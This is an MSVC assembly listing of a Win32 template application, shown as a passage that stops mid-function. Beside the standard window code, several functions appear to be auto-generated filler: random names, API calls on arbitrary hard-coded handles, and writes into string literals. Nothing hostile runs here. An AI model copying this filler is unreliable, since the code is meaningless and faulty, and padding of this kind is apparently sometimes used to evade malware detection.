	mov	DWORD PTR tv64[ebp], eax
	cmp	DWORD PTR tv64[ebp], 2
	je	$LN2@WndProc
	cmp	DWORD PTR tv64[ebp], 15			; 0000000fH
	je	$LN3@WndProc
	cmp	DWORD PTR tv64[ebp], 273		; 00000111H
	je	SHORT $LN9@WndProc
	jmp	$LN1@WndProc
$LN9@WndProc:

; 674  : 		case WM_COMMAND:
; 675  : 			wmId = LOWORD(wParam);

	mov	ecx, DWORD PTR _wParam$[ebp]
	and	ecx, 65535				; 0000ffffH
	movzx	edx, cx
	mov	DWORD PTR _wmId$[ebp], edx

; 676  : 			wmEvent = HIWORD(wParam);

	mov	eax, DWORD PTR _wParam$[ebp]
	shr	eax, 16					; 00000010H
	and	eax, 65535				; 0000ffffH
	movzx	ecx, ax
	mov	DWORD PTR _wmEvent$[ebp], ecx

; 677  : 			// Parse the menu selections:
; 678  : 			switch (wmId) {

	mov	edx, DWORD PTR _wmId$[ebp]
	mov	DWORD PTR tv72[ebp], edx
	cmp	DWORD PTR tv72[ebp], 104		; 00000068H
	je	SHORT $LN6@WndProc
	cmp	DWORD PTR tv72[ebp], 105		; 00000069H
	je	SHORT $LN5@WndProc
	jmp	SHORT $LN4@WndProc
$LN6@WndProc:

; 679  : 				case IDM_ABOUT:
; 680  : 					DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);

	push	0
	push	OFFSET ?About@@YGHPAUHWND__@@IIJ@Z	; About
	mov	eax, DWORD PTR _hWnd$[ebp]
	push	eax
	push	103					; 00000067H
	mov	ecx, DWORD PTR ?hInst@@3PAUHINSTANCE__@@A ; hInst
	push	ecx
	call	DWORD PTR __imp__DialogBoxParamA@20

; 681  : 					break;

	jmp	SHORT $LN7@WndProc
$LN5@WndProc:

; 682  : 				case IDM_EXIT:
; 683  : 					DestroyWindow(hWnd);

	mov	edx, DWORD PTR _hWnd$[ebp]
	push	edx
	call	DWORD PTR __imp__DestroyWindow@4

; 684  : 					break;

	jmp	SHORT $LN7@WndProc
$LN4@WndProc:

; 685  : 				default:
; 686  : 					return DefWindowProc(hWnd, message, wParam, lParam);

	mov	eax, DWORD PTR _lParam$[ebp]
	push	eax
	mov	ecx, DWORD PTR _wParam$[ebp]
	push	ecx
	mov	edx, DWORD PTR _message$[ebp]
	push	edx
	mov	eax, DWORD PTR _hWnd$[ebp]
	push	eax
	call	DWORD PTR __imp__DefWindowProcA@16
	jmp	SHORT $LN12@WndProc
$LN7@WndProc:

; 687  : 			}
; 688  : 			break;

	jmp	SHORT $LN10@WndProc
$LN3@WndProc:

; 689  : 		case WM_PAINT:
; 690  : 			hdc = BeginPaint(hWnd, &ps);

	lea	ecx, DWORD PTR _ps$[ebp]
	push	ecx
	mov	edx, DWORD PTR _hWnd$[ebp]
	push	edx
	call	DWORD PTR __imp__BeginPaint@8
	mov	DWORD PTR _hdc$[ebp], eax

; 691  : 			// TODO: Add any drawing code here...
; 692  : 			EndPaint(hWnd, &ps);

	lea	eax, DWORD PTR _ps$[ebp]
	push	eax
	mov	ecx, DWORD PTR _hWnd$[ebp]
	push	ecx
	call	DWORD PTR __imp__EndPaint@8

; 693  : 			break;

	jmp	SHORT $LN10@WndProc
$LN2@WndProc:

; 694  : 		case WM_DESTROY:
; 695  : 			//PostQuitMessage(0);
; 696  : 			break;

	jmp	SHORT $LN10@WndProc
$LN1@WndProc:

; 697  : 		default:
; 698  : 			return DefWindowProc(hWnd, message, wParam, lParam);

	mov	edx, DWORD PTR _lParam$[ebp]
	push	edx
	mov	eax, DWORD PTR _wParam$[ebp]
	push	eax
	mov	ecx, DWORD PTR _message$[ebp]
	push	ecx
	mov	edx, DWORD PTR _hWnd$[ebp]
	push	edx
	call	DWORD PTR __imp__DefWindowProcA@16
	jmp	SHORT $LN12@WndProc
$LN10@WndProc:

; 699  : 	}
; 700  : 	return 0;

	xor	eax, eax
$LN12@WndProc:

; 701  : }

	mov	esp, ebp
	pop	ebp
	ret	16					; 00000010H
?WndProc@@YGJPAUHWND__@@IIJ@Z ENDP			; WndProc
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\win32project1.cpp
_TEXT	SEGMENT
_hWnd$ = -4						; size = 4
_hInstance$ = 8						; size = 4
_nCmdShow$ = 12						; size = 4
?InitInstance@@YAHPAUHINSTANCE__@@H@Z PROC		; InitInstance

; 640  : BOOL InitInstance(HINSTANCE hInstance, int nCmdShow) {

	push	ebp
	mov	ebp, esp
	push	ecx

; 641  : 	HWND hWnd;
; 642  : 
; 643  : 	hInst = hInstance; // Store instance handle in our global variable

	mov	eax, DWORD PTR _hInstance$[ebp]
	mov	DWORD PTR ?hInst@@3PAUHINSTANCE__@@A, eax ; hInst

; 644  : 
; 645  : 	hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
; 646  : 						CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

	push	0
	mov	ecx, DWORD PTR _hInstance$[ebp]
	push	ecx
	push	0
	push	0
	push	0
	push	-2147483648				; 80000000H
	push	0
	push	-2147483648				; 80000000H
	push	13565952				; 00cf0000H
	push	OFFSET ?szTitle@@3PADA			; szTitle
	push	OFFSET ?szWindowClass@@3PADA		; szWindowClass
	push	0
	call	DWORD PTR __imp__CreateWindowExA@48
	mov	DWORD PTR _hWnd$[ebp], eax

; 647  : 
; 648  : 	if (!hWnd) {

	cmp	DWORD PTR _hWnd$[ebp], 0
	jne	SHORT $LN1@InitInstan

; 649  : 		return FALSE;

	xor	eax, eax
	jmp	SHORT $LN2@InitInstan
$LN1@InitInstan:

; 650  : 	}
; 651  : 
; 652  : 	ShowWindow(hWnd, nCmdShow);

	mov	edx, DWORD PTR _nCmdShow$[ebp]
	push	edx
	mov	eax, DWORD PTR _hWnd$[ebp]
	push	eax
	call	DWORD PTR __imp__ShowWindow@8

; 653  : 	UpdateWindow(hWnd);

	mov	ecx, DWORD PTR _hWnd$[ebp]
	push	ecx
	call	DWORD PTR __imp__UpdateWindow@4

; 654  : 
; 655  : 	return TRUE;

	mov	eax, 1
$LN2@InitInstan:

; 656  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?InitInstance@@YAHPAUHINSTANCE__@@H@Z ENDP		; InitInstance
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\win32project1.cpp
_TEXT	SEGMENT
_wcex$ = -48						; size = 48
_hInstance$ = 8						; size = 4
?MyRegisterClass@@YAGPAUHINSTANCE__@@@Z PROC		; MyRegisterClass

; 610  : ATOM MyRegisterClass(HINSTANCE hInstance) {

	push	ebp
	mov	ebp, esp
	sub	esp, 48					; 00000030H

; 611  : 	WNDCLASSEX wcex;
; 612  : 
; 613  : 	wcex.cbSize = sizeof(WNDCLASSEX);

	mov	DWORD PTR _wcex$[ebp], 48		; 00000030H

; 614  : 
; 615  : 	wcex.style = CS_HREDRAW | CS_VREDRAW;

	mov	DWORD PTR _wcex$[ebp+4], 3

; 616  : 	wcex.lpfnWndProc = WndProc;

	mov	DWORD PTR _wcex$[ebp+8], OFFSET ?WndProc@@YGJPAUHWND__@@IIJ@Z ; WndProc

; 617  : 	wcex.cbClsExtra = 0;

	mov	DWORD PTR _wcex$[ebp+12], 0

; 618  : 	wcex.cbWndExtra = 0;

	mov	DWORD PTR _wcex$[ebp+16], 0

; 619  : 	wcex.hInstance = hInstance;

	mov	eax, DWORD PTR _hInstance$[ebp]
	mov	DWORD PTR _wcex$[ebp+20], eax

; 620  : 	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_WIN32PROJECT1));

	push	107					; 0000006bH
	mov	ecx, DWORD PTR _hInstance$[ebp]
	push	ecx
	call	DWORD PTR __imp__LoadIconA@8
	mov	DWORD PTR _wcex$[ebp+24], eax

; 621  : 	wcex.hCursor = LoadCursor(NULL, IDC_ARROW);

	push	32512					; 00007f00H
	push	0
	call	DWORD PTR __imp__LoadCursorA@8
	mov	DWORD PTR _wcex$[ebp+28], eax

; 622  : 	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);

	mov	DWORD PTR _wcex$[ebp+32], 6

; 623  : 	wcex.lpszMenuName = MAKEINTRESOURCE(IDC_WIN32PROJECT1);

	mov	DWORD PTR _wcex$[ebp+36], 109		; 0000006dH

; 624  : 	wcex.lpszClassName = szWindowClass;

	mov	DWORD PTR _wcex$[ebp+40], OFFSET ?szWindowClass@@3PADA ; szWindowClass

; 625  : 	wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	push	108					; 0000006cH
	mov	edx, DWORD PTR _wcex$[ebp+20]
	push	edx
	call	DWORD PTR __imp__LoadIconA@8
	mov	DWORD PTR _wcex$[ebp+44], eax

; 626  : 
; 627  : 	return RegisterClassEx(&wcex);

	lea	eax, DWORD PTR _wcex$[ebp]
	push	eax
	call	DWORD PTR __imp__RegisterClassExA@4

; 628  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?MyRegisterClass@@YAGPAUHINSTANCE__@@@Z ENDP		; MyRegisterClass
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\win32project1.cpp
_TEXT	SEGMENT
_hNgJWGLk$ = -28					; size = 4
_xpthC$ = -24						; size = 4
_RlscsouW$ = -20					; size = 4
_TbFurMDO$ = -16					; size = 4
_ZbTMtZhJf$ = -12					; size = 4
_YgmkbEdUG$ = -8					; size = 4
_nIcJD$ = -4						; size = 4
?func_2_3@@YAXXZ PROC					; func_2_3

; 299  : VOID func_2_3() {

	push	ebp
	mov	ebp, esp
	sub	esp, 28					; 0000001cH

; 300  : 	HINSTANCE xpthC = (HINSTANCE)0x03500DB0;

	mov	DWORD PTR _xpthC$[ebp], 55578032	; 03500db0H

; 301  : 	HWND YgmkbEdUG = (HWND)0x58F560A9;

	mov	DWORD PTR _YgmkbEdUG$[ebp], 1492476073	; 58f560a9H

; 302  : 	HMENU ZbTMtZhJf = (HMENU)0x4A1AE65D;

	mov	DWORD PTR _ZbTMtZhJf$[ebp], 1243276893	; 4a1ae65dH

; 303  : 	HINSTANCE hNgJWGLk = (HINSTANCE)0x5FA4767B;

	mov	DWORD PTR _hNgJWGLk$[ebp], 1604613755	; 5fa4767bH

; 304  : 	HANDLE TbFurMDO = (HANDLE)0x3922A582;

	mov	DWORD PTR _TbFurMDO$[ebp], 958571906	; 3922a582H

; 305  : 	DWORD nIcJD = (DWORD)0x48B2D2D1;

	mov	DWORD PTR _nIcJD$[ebp], 1219678929	; 48b2d2d1H

; 306  : 	PCHAR RlscsouW = (PCHAR)"Mx1E";

	mov	DWORD PTR _RlscsouW$[ebp], OFFSET $SG53475

; 307  : 
; 308  : 	GetACP();

	call	DWORD PTR __imp__GetACP@0

; 309  : 	UpdateWindow((HWND)0x1B2C2F79);

	push	455880569				; 1b2c2f79H
	call	DWORD PTR __imp__UpdateWindow@4

; 310  : 	TbFurMDO = GetProcessHeap();

	call	DWORD PTR __imp__GetProcessHeap@0
	mov	DWORD PTR _TbFurMDO$[ebp], eax

; 311  : 
; 312  : 	nIcJD = GetLastError();

	call	DWORD PTR __imp__GetLastError@0
	mov	DWORD PTR _nIcJD$[ebp], eax

; 313  : 
; 314  : 	IsDlgButtonChecked((HWND)0x5353D76C, (DWORD)0x33DC068F);

	push	870057615				; 33dc068fH
	push	1398003564				; 5353d76cH
	call	DWORD PTR __imp__IsDlgButtonChecked@8

; 315  : 	GetLastError();

	call	DWORD PTR __imp__GetLastError@0

; 316  : 	ZbTMtZhJf = GetSystemMenu(YgmkbEdUG, FALSE);

	push	0
	mov	eax, DWORD PTR _YgmkbEdUG$[ebp]
	push	eax
	call	DWORD PTR __imp__GetSystemMenu@8
	mov	DWORD PTR _ZbTMtZhJf$[ebp], eax

; 317  : 
; 318  : 	IsWindow((HWND)0x6335A489);

	push	1664459913				; 6335a489H
	call	DWORD PTR __imp__IsWindow@4

; 319  : 	nIcJD = GetLastError();

	call	DWORD PTR __imp__GetLastError@0
	mov	DWORD PTR _nIcJD$[ebp], eax

; 320  : 
; 321  : 	ZbTMtZhJf = GetMenu(YgmkbEdUG);

	mov	ecx, DWORD PTR _YgmkbEdUG$[ebp]
	push	ecx
	call	DWORD PTR __imp__GetMenu@4
	mov	DWORD PTR _ZbTMtZhJf$[ebp], eax

; 322  : 
; 323  : 	ShowWindow(YgmkbEdUG, (DWORD)0x1DA1BACC);

	push	497138380				; 1da1baccH
	mov	edx, DWORD PTR _YgmkbEdUG$[ebp]
	push	edx
	call	DWORD PTR __imp__ShowWindow@8

; 324  : 	nIcJD = GetACP();

	call	DWORD PTR __imp__GetACP@0
	mov	DWORD PTR _nIcJD$[ebp], eax

; 325  : 
; 326  : 	GetProcessHeap();

	call	DWORD PTR __imp__GetProcessHeap@0

; 327  : 	nIcJD = lstrlenA(RlscsouW);

	mov	eax, DWORD PTR _RlscsouW$[ebp]
	push	eax
	call	DWORD PTR __imp__lstrlenA@4
	mov	DWORD PTR _nIcJD$[ebp], eax

; 328  : 
; 329  : 	RemoveMenu((HMENU)0x5A761EA5, nIcJD, (DWORD)0x4B338D44);

	push	1261669700				; 4b338d44H
	mov	ecx, DWORD PTR _nIcJD$[ebp]
	push	ecx
	push	1517690533				; 5a761ea5H
	call	DWORD PTR __imp__RemoveMenu@12

; 330  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?func_2_3@@YAXXZ ENDP					; func_2_3
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\win32project1.cpp
_TEXT	SEGMENT
_zfGNcbBZK$ = -40					; size = 4
_FLoDmz$ = -36						; size = 4
_bucoTbJUMqQ$ = -32					; size = 4
_tiYsI$ = -28						; size = 4
_csOsSgxPagy$ = -24					; size = 4
_PCuuYzfYkM$ = -20					; size = 4
_rLWCDI$ = -16						; size = 4
_hetkyCsTgkJ$ = -12					; size = 4
_akTRAr$ = -8						; size = 4
_YJnNHoZT$ = -4						; size = 4
_aAjKjwuMfSK$ = 8					; size = 4
_ZksjetIp$ = 12						; size = 4
?func_2_2@@YAPAXPAKPA_W@Z PROC				; func_2_2

; 268  : PVOID func_2_2(PDWORD aAjKjwuMfSK, PWCHAR ZksjetIp) {

	push	ebp
	mov	ebp, esp
	sub	esp, 40					; 00000028H

; 269  : 	LONG csOsSgxPagy = (LONG)0x3AAC7A8D;

	mov	DWORD PTR _csOsSgxPagy$[ebp], 984382093	; 3aac7a8dH

; 270  : 	PLONG tiYsI = (PLONG)0x0DB5C266;

	mov	DWORD PTR _tiYsI$[ebp], 230015590	; 0db5c266H

; 271  : 	PLONG bucoTbJUMqQ = (PLONG)0x795D683C;

	mov	DWORD PTR _bucoTbJUMqQ$[ebp], 2036164668 ; 795d683cH

; 272  : 	HANDLE FLoDmz = (HANDLE)0x79C5AD14;

	mov	DWORD PTR _FLoDmz$[ebp], 2042998036	; 79c5ad14H

; 273  : 	DWORD akTRAr = (DWORD)0x161C8B32;

	mov	DWORD PTR _akTRAr$[ebp], 370969394	; 161c8b32H

; 274  : 	PCHAR YJnNHoZT = (PCHAR)"4DyZgllRUo";

	mov	DWORD PTR _YJnNHoZT$[ebp], OFFSET $SG53444

; 275  : 	BOOL PCuuYzfYkM = (BOOL)TRUE;

	mov	DWORD PTR _PCuuYzfYkM$[ebp], 1

; 276  : 	HINSTANCE zfGNcbBZK = (HINSTANCE)0x405DE7EB;

	mov	DWORD PTR _zfGNcbBZK$[ebp], 1079896043	; 405de7ebH

; 277  : 	HDC hetkyCsTgkJ = (HDC)0x31C5104C;

	mov	DWORD PTR _hetkyCsTgkJ$[ebp], 834998348	; 31c5104cH

; 278  : 	HWND rLWCDI = (HWND)0x200C14FD;

	mov	DWORD PTR _rLWCDI$[ebp], 537662717	; 200c14fdH

; 279  : 
; 280  : 	lstrcatA("EqC1g3dX3N", "TRikUXSj");

	push	OFFSET $SG53453
	push	OFFSET $SG53454
	call	DWORD PTR __imp__lstrcatA@8

; 281  : 	lstrcatW(L"IcinK", L"nFVWReBB23J");

	push	OFFSET $SG53455
	push	OFFSET $SG53456
	call	DWORD PTR __imp__lstrcatW@8

; 282  : 
; 283  : 	SetForegroundWindow((HWND)0x24350039);

	push	607453241				; 24350039H
	call	DWORD PTR __imp__SetForegroundWindow@4

; 284  : 	func_2_3();

	call	?func_2_3@@YAXXZ			; func_2_3

; 285  : 	akTRAr = lstrcmpA(YJnNHoZT, YJnNHoZT);

	mov	eax, DWORD PTR _YJnNHoZT$[ebp]
	push	eax
	mov	ecx, DWORD PTR _YJnNHoZT$[ebp]
	push	ecx
	call	DWORD PTR __imp__lstrcmpA@8
	mov	DWORD PTR _akTRAr$[ebp], eax

; 286  : 
; 287  : 
; 288  : 	akTRAr = GetACP();

	call	DWORD PTR __imp__GetACP@0
	mov	DWORD PTR _akTRAr$[ebp], eax

; 289  : 
; 290  : 	GetCommandLineW();

	call	DWORD PTR __imp__GetCommandLineW@0

; 291  : 	hetkyCsTgkJ = func_0_3();

	call	?func_0_3@@YAPAUHDC__@@XZ		; func_0_3
	mov	DWORD PTR _hetkyCsTgkJ$[ebp], eax

; 292  : 
; 293  : 
; 294  : 	PCuuYzfYkM = IsWindow(rLWCDI);

	mov	edx, DWORD PTR _rLWCDI$[ebp]
	push	edx
	call	DWORD PTR __imp__IsWindow@4
	mov	DWORD PTR _PCuuYzfYkM$[ebp], eax

; 295  : 
; 296  : 	return (PVOID)hetkyCsTgkJ;

	mov	eax, DWORD PTR _hetkyCsTgkJ$[ebp]

; 297  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?func_2_2@@YAPAXPAKPA_W@Z ENDP				; func_2_2
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\win32project1.cpp
_TEXT	SEGMENT
_cwUNP$ = -28						; size = 4
_vlBu$ = -24						; size = 4
_WsvAqwvk$ = -20					; size = 4
_ImLlSxpqEQ$ = -16					; size = 4
_TVsa$ = -12						; size = 4
_EUMTBXDj$ = -8						; size = 4
_ozHNWZmWs$ = -4					; size = 4
_gvMkd$ = 8						; size = 4
_xDox$ = 12						; size = 4
_LkvOkrPx$ = 16						; size = 4
_cHTCif$ = 20						; size = 4
_obRQybuSqwx$ = 24					; size = 4
_DaQDDQs$ = 28						; size = 4
?func_2_1@@YAPAXKPAUHINSTANCE__@@PA_WPADPAUHDC__@@3@Z PROC ; func_2_1

; 245  : HANDLE func_2_1(DWORD gvMkd, HMODULE xDox, PWCHAR LkvOkrPx, PCHAR cHTCif, HDC obRQybuSqwx, HDC DaQDDQs) {

	push	ebp
	mov	ebp, esp
	sub	esp, 28					; 0000001cH

; 246  : 	PCHAR TVsa = (PCHAR)"Br6mGD9ZZ9";

	mov	DWORD PTR _TVsa$[ebp], OFFSET $SG53410

; 247  : 	PDWORD EUMTBXDj = (PDWORD)0x643D5C39;

	mov	DWORD PTR _EUMTBXDj$[ebp], 1681742905	; 643d5c39H

; 248  : 	PVOID ozHNWZmWs = (PVOID)0x598772EC;

	mov	DWORD PTR _ozHNWZmWs$[ebp], 1502049004	; 598772ecH

; 249  : 	HWND ImLlSxpqEQ = (HWND)0x5E241CE8;

	mov	DWORD PTR _ImLlSxpqEQ$[ebp], 1579425000	; 5e241ce8H

; 250  : 	BOOL WsvAqwvk = (BOOL)TRUE;

	mov	DWORD PTR _WsvAqwvk$[ebp], 1

; 251  : 	PLONG vlBu = (PLONG)0x77BF8FE7;

	mov	DWORD PTR _vlBu$[ebp], 2009042919	; 77bf8fe7H

; 252  : 	LONG cwUNP = (LONG)0x1182E8E3;

	mov	DWORD PTR _cwUNP$[ebp], 293791971	; 1182e8e3H

; 253  : 
; 254  : 
; 255  : 
; 256  : 	gvMkd = lstrlenW(LkvOkrPx);

	mov	eax, DWORD PTR _LkvOkrPx$[ebp]
	push	eax
	call	DWORD PTR __imp__lstrlenW@4
	mov	DWORD PTR _gvMkd$[ebp], eax

; 257  : 
; 258  : 	GetACP();

	call	DWORD PTR __imp__GetACP@0

; 259  : 	lstrlenA("b5iwLJw");

	push	OFFSET $SG53423
	call	DWORD PTR __imp__lstrlenA@4

; 260  : 
; 261  : 	ozHNWZmWs = func_2_2(EUMTBXDj, L"GOqYPTO");

	push	OFFSET $SG53424
	mov	ecx, DWORD PTR _EUMTBXDj$[ebp]
	push	ecx
	call	?func_2_2@@YAPAXPAKPA_W@Z		; func_2_2
	add	esp, 8
	mov	DWORD PTR _ozHNWZmWs$[ebp], eax

; 262  : 
; 263  : 	ozHNWZmWs = func_2_2((PDWORD)0x7E820BFB, L"wVNysCBX");

	push	OFFSET $SG53426
	push	2122451963				; 7e820bfbH
	call	?func_2_2@@YAPAXPAKPA_W@Z		; func_2_2
	add	esp, 8
	mov	DWORD PTR _ozHNWZmWs$[ebp], eax

; 264  : 
; 265  : 	return (HANDLE)cHTCif;

	mov	eax, DWORD PTR _cHTCif$[ebp]

; 266  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?func_2_1@@YAPAXKPAUHINSTANCE__@@PA_WPADPAUHDC__@@3@Z ENDP ; func_2_1
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\win32project1.cpp
_TEXT	SEGMENT
_CRaBScHIIt$ = -32					; size = 4
_FAMsex$ = -28						; size = 4
_HiHkmmZyZ$ = -24					; size = 4
_rJvlzgTu$ = -20					; size = 4
_sBjBRE$ = -16						; size = 4
_TthWnB$ = -12						; size = 4
_fKlU$ = -8						; size = 4
_wTCc$ = -4						; size = 4
_kdqr$ = 8						; size = 4
_CXGktXT$ = 12						; size = 4
_dcxGznefx$ = 16					; size = 4
?func_2_0@@YAKKJPAX@Z PROC				; func_2_0

; 218  : DWORD func_2_0(DWORD kdqr, LONG CXGktXT, HANDLE dcxGznefx) {

	push	ebp
	mov	ebp, esp
	sub	esp, 32					; 00000020H

; 219  : 	PCHAR fKlU = (PCHAR)"W0Vh58Z4xe";

	mov	DWORD PTR _fKlU$[ebp], OFFSET $SG53385

; 220  : 	HANDLE TthWnB = (HANDLE)0x69678757;

	mov	DWORD PTR _TthWnB$[ebp], 1768392535	; 69678757H

; 221  : 	BOOL sBjBRE = (BOOL)TRUE;

	mov	DWORD PTR _sBjBRE$[ebp], 1

; 222  : 	HWND rJvlzgTu = (HWND)0x445EFCA7;

	mov	DWORD PTR _rJvlzgTu$[ebp], 1147075751	; 445efca7H

; 223  : 	PVOID HiHkmmZyZ = (PVOID)0x5F6AA81A;

	mov	DWORD PTR _HiHkmmZyZ$[ebp], 1600825370	; 5f6aa81aH

; 224  : 	PDWORD FAMsex = (PDWORD)0x4705A65D;

	mov	DWORD PTR _FAMsex$[ebp], 1191552605	; 4705a65dH

; 225  : 	HMENU wTCc = (HMENU)0x71CA5D17;

	mov	DWORD PTR _wTCc$[ebp], 1909087511	; 71ca5d17H

; 226  : 	HINSTANCE CRaBScHIIt = (HINSTANCE)0x68C1313F;

	mov	DWORD PTR _CRaBScHIIt$[ebp], 1757491519	; 68c1313fH

; 227  : 
; 228  : 
; 229  : 	kdqr = GetACP();

	call	DWORD PTR __imp__GetACP@0
	mov	DWORD PTR _kdqr$[ebp], eax

; 230  : 
; 231  : 
; 232  : 
; 233  : 	wTCc = CreateMenu();

	call	DWORD PTR __imp__CreateMenu@0
	mov	DWORD PTR _wTCc$[ebp], eax

; 234  : 
; 235  : 	GetLastError();

	call	DWORD PTR __imp__GetLastError@0

; 236  : 	GetSysColor(kdqr);

	mov	eax, DWORD PTR _kdqr$[ebp]
	push	eax
	call	DWORD PTR __imp__GetSysColor@4

; 237  : 	dcxGznefx = GetProcessHeap();

	call	DWORD PTR __imp__GetProcessHeap@0
	mov	DWORD PTR _dcxGznefx$[ebp], eax

; 238  : 
; 239  : 	kdqr = GetLastError();

	call	DWORD PTR __imp__GetLastError@0
	mov	DWORD PTR _kdqr$[ebp], eax

; 240  : 
; 241  : 
; 242  : 	return kdqr;

	mov	eax, DWORD PTR _kdqr$[ebp]

; 243  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?func_2_0@@YAKKJPAX@Z ENDP				; func_2_0
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\win32project1.cpp
_TEXT	SEGMENT
_YrRntrNPf$ = -36					; size = 4
_POoek$ = -32						; size = 4
_iuZtRadAG$ = -28					; size = 4
_WHjg$ = -24						; size = 4
_mQXzKRuNaww$ = -20					; size = 4
_umCJzvK$ = -16						; size = 4
_SYAekx$ = -12						; size = 4
_fhOsPDNAU$ = -8					; size = 4
_jAcowYHH$ = -4						; size = 4
_UCZcsyw$ = 8						; size = 4
_vTSGLEmXDep$ = 12					; size = 4
?func_1_1@@YAPAUHMENU__@@PAUHDC__@@J@Z PROC		; func_1_1

; 182  : HMENU func_1_1(HDC UCZcsyw, LONG vTSGLEmXDep) {

	push	ebp
	mov	ebp, esp
	sub	esp, 36					; 00000024H

; 183  : 	HINSTANCE POoek = (HINSTANCE)0x2D659FD2;

	mov	DWORD PTR _POoek$[ebp], 761634770	; 2d659fd2H

; 184  : 	LONG YrRntrNPf = (LONG)0x1125C749;

	mov	DWORD PTR _YrRntrNPf$[ebp], 287688521	; 1125c749H

; 185  : 	HMENU iuZtRadAG = (HMENU)0x5DC286EE;

	mov	DWORD PTR _iuZtRadAG$[ebp], 1573029614	; 5dc286eeH

; 186  : 	PWCHAR fhOsPDNAU = (PWCHAR)L"fIjv";

	mov	DWORD PTR _fhOsPDNAU$[ebp], OFFSET $SG53356

; 187  : 	DWORD SYAekx = (DWORD)0x6D26905D;

	mov	DWORD PTR _SYAekx$[ebp], 1831243869	; 6d26905dH

; 188  : 	BOOL mQXzKRuNaww = (BOOL)TRUE;

	mov	DWORD PTR _mQXzKRuNaww$[ebp], 1

; 189  : 	HWND jAcowYHH = (HWND)0x4FE1F455;

	mov	DWORD PTR _jAcowYHH$[ebp], 1340208213	; 4fe1f455H

; 190  : 	HANDLE umCJzvK = (HANDLE)0x6287032F;

	mov	DWORD PTR _umCJzvK$[ebp], 1653015343	; 6287032fH

; 191  : 	PCHAR WHjg = (PCHAR)"5gHXx";

	mov	DWORD PTR _WHjg$[ebp], OFFSET $SG53367

; 192  : 
; 193  : 	lstrcatW(fhOsPDNAU, fhOsPDNAU);

	mov	eax, DWORD PTR _fhOsPDNAU$[ebp]
	push	eax
	mov	ecx, DWORD PTR _fhOsPDNAU$[ebp]
	push	ecx
	call	DWORD PTR __imp__lstrcatW@8

; 194  : 	GetProcessHeap();

	call	DWORD PTR __imp__GetProcessHeap@0

; 195  : 	SYAekx = GetMenuState((HMENU)0x2CCCC2EC, (DWORD)0x1CB4ACAB, SYAekx);

	mov	edx, DWORD PTR _SYAekx$[ebp]
	push	edx
	push	481602731				; 1cb4acabH
	push	751616748				; 2cccc2ecH
	call	DWORD PTR __imp__GetMenuState@12
	mov	DWORD PTR _SYAekx$[ebp], eax

; 196  : 
; 197  : 	lstrlenW(L"0HtCH9Ei");

	push	OFFSET $SG53370
	call	DWORD PTR __imp__lstrlenW@4

; 198  : 	mQXzKRuNaww = IsWindowVisible(jAcowYHH);

	mov	eax, DWORD PTR _jAcowYHH$[ebp]
	push	eax
	call	DWORD PTR __imp__IsWindowVisible@4
	mov	DWORD PTR _mQXzKRuNaww$[ebp], eax

; 199  : 
; 200  : 	umCJzvK = GetPropW((HWND)0x3958C3B0, fhOsPDNAU);

	mov	ecx, DWORD PTR _fhOsPDNAU$[ebp]
	push	ecx
	push	962118576				; 3958c3b0H
	call	DWORD PTR __imp__GetPropW@8
	mov	DWORD PTR _umCJzvK$[ebp], eax

; 201  : 
; 202  : 	GetPropA(jAcowYHH, "uynAE2I8o");

	push	OFFSET $SG53372
	mov	edx, DWORD PTR _jAcowYHH$[ebp]
	push	edx
	call	DWORD PTR __imp__GetPropA@8

; 203  : 	SYAekx = GetKeyState((DWORD)0x48F7D632);

	push	1224201778				; 48f7d632H
	call	DWORD PTR __imp__GetKeyState@4
	cwde
	mov	DWORD PTR _SYAekx$[ebp], eax

; 204  : 
; 205  : 	umCJzvK = GetPropW((HWND)0x3CCAC632, fhOsPDNAU);

	mov	ecx, DWORD PTR _fhOsPDNAU$[ebp]
	push	ecx
	push	1019921970				; 3ccac632H
	call	DWORD PTR __imp__GetPropW@8
	mov	DWORD PTR _umCJzvK$[ebp], eax

; 206  : 
; 207  : 	jAcowYHH = SetFocus(jAcowYHH);

	mov	edx, DWORD PTR _jAcowYHH$[ebp]
	push	edx
	call	DWORD PTR __imp__SetFocus@4
	mov	DWORD PTR _jAcowYHH$[ebp], eax

; 208  : 
; 209  : 	GetLastError();

	call	DWORD PTR __imp__GetLastError@0

; 210  : 	mQXzKRuNaww = SetWindowTextA((HWND)0x6EDCF9D1, "xRmoMUa");

	push	OFFSET $SG53376
	push	1859975633				; 6edcf9d1H
	call	DWORD PTR __imp__SetWindowTextA@8
	mov	DWORD PTR _mQXzKRuNaww$[ebp], eax

; 211  : 
; 212  : 	DestroyWindow(jAcowYHH);

	mov	eax, DWORD PTR _jAcowYHH$[ebp]
	push	eax
	call	DWORD PTR __imp__DestroyWindow@4

; 213  : 	WHjg = lstrcatA("Q1D2", WHjg);

	mov	ecx, DWORD PTR _WHjg$[ebp]
	push	ecx
	push	OFFSET $SG53377
	call	DWORD PTR __imp__lstrcatA@8
	mov	DWORD PTR _WHjg$[ebp], eax

; 214  : 
; 215  : 	return iuZtRadAG;

